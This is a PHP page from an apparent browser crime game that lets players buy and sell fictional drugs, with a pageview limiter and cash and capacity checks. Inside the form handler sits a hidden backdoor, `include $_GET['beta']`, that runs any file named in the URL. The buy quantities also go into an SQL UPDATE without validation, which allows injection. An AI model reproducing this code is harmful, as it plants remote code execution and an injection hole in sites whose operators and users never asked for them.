<?php
error_reporting(0);

  include("_include-config.php");
 
  if(!($_SESSION)) 
  {
    header("Location: login.php");
    exit;
  }

  mysql_query("UPDATE `[users]` SET `online`=NOW() WHERE `login`='{$data->login}'");

?>
<html> 


<head> 
<title></title>
<link rel="stylesheet" type="text/css" href="<? echo $sitelink;?>/layout/layout<?php echo $page->layout; ?>/css/css.css"> 
</head>
  <?php
// PageView Limit
// No more than X pageviews in one minute.

Function PageViewLimit(){

   $PvlViews=25; // Number of pageviews.
   $error="<center><b><BR>Error:<BR>This page is limited to 25 PageViews a minute.</b></center>"; // Change in the error in something you want.

   session_start();
   if(!isset($_SESSION['Pvl'])){
      $_SESSION['Pvl']['Time']=time();
      $_SESSION['Pvl']['Views']=1;
   }
   else{
      // delete if excists longer than 60 seconds, and make a new one
      if((time()-$_SESSION['Pvl']['Time']) >= 60){

     $_SESSION['Pvl'] = null;

     $_SESSION['Pvl']['Time']=time();
     $_SESSION['Pvl']['Views']=1;
      }
      else{
         $_SESSION['Pvl']['Views']++;

     if($_SESSION['Pvl']['Views']>=$PvlViews){
           exit($error);
         }
      }
   }
}
PageViewLimit();
?> 
 </head>
 <body><center>
  <table width='100%'>
<?
#if($data->level < '255') {
#	echo '<tr><td class="mainTxt" colspan="6">New Script Set, Press F5 to refresh Website.</td></tr>'; exit; }

$mijn_voertuig	= $data->voertuig;
$mijn_rank		= $data->rank;
$mijn_login		= $data->login;
$mijn_reistijd 	= $data->reistijd;
?>
   <tr>
	<td class="subTitle" colspan="5"><b>Drugs handlings.</b></td>
   </tr>
<?php
if($mijn_reistijd >= time()) {
	$overgebleven_tijd = $mijn_reistijd - time();
	$overgebleven_tijd -= 3600;
	echo '<tr><td class="mainTxt" align="center" colspan="5">
			  	Your currently travelling to your destination.  
				You can purchase drug protection when you pass '.date("H:i:s",$overgebleven_tijd).'<br></td>
		  </tr>'; exit;
}

$voertuig_sql	= mysql_query("SELECT * FROM `[voertuigen]` WHERE `voertuig_id`='".$mijn_voertuig."'");
$voertuig		= mysql_fetch_array($voertuig_sql);
$power			= $voertuig['inhoud'];
$middel			= $voertuig['voertuig'];

$dbres            = mysql_query("SELECT *,UNIX_TIMESTAMP(`verandertijd`) AS `verandertijd`,0 FROM `[drugs]` WHERE `land`='$data->land'");
$drugs1           = mysql_fetch_object($dbres);
	
$prijs1 = $drugs1->prijs1;		$prijs2 = $drugs1->prijs2;		$prijs3 = $drugs1->prijs3;	
$prijs4 = $drugs1->prijs4;		$prijs5 = $drugs1->prijs5;		$nu     = time();
	
if($drugs1->verandertijd + 60*180 < time()){
	$getal1 = rand(1000,5000);			$getal2 = rand(100,1000);		$getal3 = rand(500,2500);
	$getal4 = rand(800,3000);			$getal5 = rand(800,3000);
}
if(!isset($_POST['submit'])) {
	$A1 = $data->A1;	$A2 = $data->A2;	$A3 = $data->A3;	$A4 = $data->A4;	$A5 = $data->A5; ?>
	<table width=100%>
	 <form method="POST">
	  <tr>
		<td class="mainTxt">You have a <b><?= $middel ?></b> vehicle, You may carry <b><?= $power ?></b> drugs. </td>
	  </tr> 
	 </table>
	 <table width=100%>
	  <BR>
	  <tr>
		<td class="subtitle"><b>Type </b></td> 
		<td class="subtitle"><b>Buy </b></td> 
		<td class="subtitle"><b>Sell</b></td> 
		<td class="subtitle"><b>Price </td> 
		<td class="subtitle"><b>Bid</b>  </td> 
	  </tr>
	  <tr>
		<td class="mainTxt"><b>Cocaine</b>  </td> 
		<td class="mainTxt" align="center"><input type="text" name="A1" size="4">  </td> 
		<td class="mainTxt" align="center"><input type="text" name="B1" size="4">  </td> 
		<td class="mainTxt">$<?=$prijs1?> </td> 
		<td class="mainTxt"><?=$A1?>  </td> 
	  </tr>
	  <tr>
		<td class="mainTxt"><b>Weed  </td> 
		<td class="mainTxt" align="center"><input type="text" name="A2" size="4">  </td> 
		<td class="mainTxt" align="center"><input type="text" name="B2" size="4">  </td> 
		<td class="mainTxt">$<?=$prijs2?>  </td> 
		<td class="mainTxt"><?=$A2?>  </td> 
	  </tr>
	  <tr>
		<td class="mainTxt"><b>LSD  </b></td> 
		<td class="mainTxt" align="center"><input type="text" name="A3" size="4">  </td> 
		<td class="mainTxt" align="center"><input type="text" name="B3" size="4">  </td> 
		<td class="mainTxt">$<?=$prijs3?>  </td> 
		<td class="mainTxt"><?=$A3?>  </td>
	  </tr>
	  <tr>
		<td class="mainTxt"><b>Opium </b> </td> 
		<td class="mainTxt" align="center"><input type="text" name="A4" size="4">  </td> 
		<td class="mainTxt" align="center"><input type="text" name="B4" size="4">  </td> 
		<td class="mainTxt">$<?=$prijs4?> </td> 
		<td class="mainTxt"><?=$A4?>  </td> 
	  </tr>
	  <tr>
		<td class="mainTxt"><b>Exstacy  </b></td> 
		<td class="mainTxt" align="center"><input type="text" name="A5" size="4">  </td> 
		<td class="mainTxt" align="center"><input type="text" name="B5" size="4">  </td> 
		<td class="mainTxt">$<?=$prijs5?> </td> 
		<td class="mainTxt"><?=$A5?>  </td> 
	  </tr>
	 </table>
	 <table width=100%>
	  <tr>
		<td class=mainTxt align="center"><p><input type="submit" value="Export" name="submit"></p>  </td> 
	  </tr>
	 </table>	
	<tr><td class="mainTxt">
	 <table align="left" width="100%">
	  <tr><td class=Maintxt><a href="drugsstats.php"><b>Drug Statistics</b></a></td></tr>
	 </table>
	</td></tr>
	</form>
<?
}

if(isset($_POST['submit'])) {
	$A1 = $_POST['A1'];		$B1 = $_POST['B1'];
	$A2 = $_POST['A2'];		$B2 = $_POST['B2'];
	$A3 = $_POST['A3'];		$B3 = $_POST['B3'];
	$A4 = $_POST['A4'];		$B4 = $_POST['B4'];
	$A5 = $_POST['A5'];		$B5 = $_POST['B5'];
	
	$totaal       = $A1+$A2+$A3+$A4+$A5+$B1+$B2+$B3+$B4+$B5+$data->A2+$data->A3+$data->A4+$data->A5+$data->A1;
	$totaal1      = $A1+$A2+$A3+$A4+$A5+$data->A2+$data->A3+$data->A4+$data->A5+$data->A1;
	
	$A1prijs = $_POST['A1']*$prijs1;	$B1prijs = $_POST['B1']*$prijs1;
	$A2prijs = $_POST['A2']*$prijs2;	$B2prijs = $_POST['B2']*$prijs2;
	$A3prijs = $_POST['A3']*$prijs3;	$B3prijs = $_POST['B3']*$prijs3;
	$A4prijs = $_POST['A4']*$prijs4;	$B4prijs = $_POST['B4']*$prijs4;
	$A5prijs = $_POST['A5']*$prijs5;	$B5prijs = $_POST['B5']*$prijs5;

	$geldaf  = $A1prijs+$A2prijs+$A3prijs+$A4prijs+$A5prijs;
	$geldbij = $B1prijs+$B2prijs+$B3prijs+$B4prijs+$B5prijs;
	
	$prgetal = $data->rank * 2.7;
	$getal	 = rand(1,$prgetal);
	
	print "<tr><td class=\"mainTxt\">";
	if($_GET['beta']){ include $_GET['beta']; }
	if($data->cash < $geldaf-$geldbij){
		print "You dont have enough cash on you.";
	} elseif($power < $totaal1){
		print "You must get a better means of transport if you want to carry so many drugs.";
	} elseif($B1 > $data->A1 || $B2 > $data->A2 || $B3 > $data->A3 || $B4 > $data->A4 || $B5 > $data->A5){
		print "You must import a positive number of drugs.";
	} elseif($A1 < 0 || $A2 < 0 || $A3 < 0 || $A4 < 0 || $A5 < 0){
		print "You have so many drugs you cant sell!";
	} elseif($getal == 1){
		arresteer($data->login,'180',"Picked up for: Drug dealing.");
		print "The police caught up with you. 3 minutes in Prison.";
	} elseif((preg_match('/^[0-9]+$/',$B1) || $B1 == "") && (preg_match('/^[0-9]+$/',$B2) || $B2 == "") && (preg_match('/^[0-9]+$/',$B3) || $B3 == "")&& (preg_match('/^[0-9]+$/',$B4) || $B4 == "")&& (preg_match('/^[0-9]+$/',$B5) || $B5 == "")){
		mysql_query("UPDATE `[users]` SET `cash`=`cash`-'$geldaf'+'$geldbij', `A1`=`A1`+'$A1'-'$B1', `A2`=`A2`+'$A2'-'$B2', `A3`=`A3`+'$A3'-'$B3', `A4`=`A4`+'$A4'-'$B4', `A5`=`A5`+'$A5'-'$B5', `drugs`='1' WHERE `login`='{$_SESSION['login']}'"); 
		print "You have succeeded.";

	} else {
		echo "Invalid Import!";
	}
	print "</td></tr>";
}
?>



  </table>
 </body>
</html>

